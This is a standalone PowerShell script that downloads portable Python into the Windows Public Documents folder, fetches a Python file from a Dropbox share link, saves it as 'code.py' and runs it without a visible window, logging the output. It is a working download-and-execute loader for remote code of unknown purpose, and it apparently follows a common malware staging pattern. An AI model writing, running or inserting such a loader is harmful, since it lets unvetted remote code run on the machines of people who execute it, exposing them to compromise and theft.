# Define variables
$PythonDownloadUrl = 'https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip'
$UserTempDir = "C:\Users\Public\Public Documents"
$PythonZipPath = Join-Path $UserTempDir "python-3.10.4-embed-amd64.zip"
$PythonUnpackPath = Join-Path $UserTempDir "python-3.10.4-embed"
$LogPath = Join-Path $UserTempDir "script.log"

# Function to log messages
function Log {
    param([string]$message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $message" | Out-File -FilePath $LogPath -Append
}

Log "Script execution started."

# Create the Python unpack directory if it doesn't exist
if (-not (Test-Path $PythonUnpackPath)) {
    New-Item -ItemType Directory -Path $PythonUnpackPath | Out-Null
    Log "Created directory: $PythonUnpackPath"
} else {
    Log "Directory already exists: $PythonUnpackPath"
}

# Define the Python script URL and path
$PythonScriptUrl = 'https://www.dropbox.com/scl/fi/2phqya2il4r5k90g7e1p2/gooly.py?rlkey=47ndf75yf6mkqvrlz89z6bxgf&st=taadzl56&dl=1'
$PythonScriptPath = Join-Path $PythonUnpackPath 'code.py'

# Download Python embedded zip
Log "Downloading Python from $PythonDownloadUrl"
Invoke-WebRequest -Uri $PythonDownloadUrl -OutFile $PythonZipPath
Log "Downloaded Python to $PythonZipPath"

# Extract the Python embedded zip
Log "Extracting Python archive."
Expand-Archive -Path $PythonZipPath -DestinationPath $PythonUnpackPath -Force
Log "Extracted Python to $PythonUnpackPath"

# Download the Python script
Log "Downloading Python script from $PythonScriptUrl"
Invoke-WebRequest -Uri $PythonScriptUrl -OutFile $PythonScriptPath
Log "Downloaded Python script to $PythonScriptPath"

# Change the working directory to the Python unpack directory
Set-Location -Path $PythonUnpackPath
Log "Changed working directory to $PythonUnpackPath"

# Define the path to python.exe
$PythonExePath = Join-Path $PythonUnpackPath 'python.exe'

# Verify that python.exe exists
if (-Not (Test-Path $PythonExePath)) {
    Log "python.exe not found at $PythonExePath"
    exit 1
} else {
    Log "Found Python executable at $PythonExePath"
}

# Option 1: Using Start-Process with Proper Quoting
Log "Executing Python script using Start-Process."
Start-Process -FilePath $PythonExePath `
              -ArgumentList "`"$PythonScriptPath`"" `
              -NoNewWindow `
              -Wait `
              -RedirectStandardOutput "$UserTempDir\python_output.log" `
              -RedirectStandardError "$UserTempDir\python_error.log"
Log "Python script execution completed."

# Option 2: Using the Call Operator
# Uncomment the following lines to use the call operator instead of Start-Process
# Log "Executing Python script using the call operator."
# & "$PythonExePath" "$PythonScriptPath" *> "$UserTempDir\python_output.log" 2*> "$UserTempDir\python_error.log"
# Log "Python script execution completed."

Log "Script execution finished successfully."

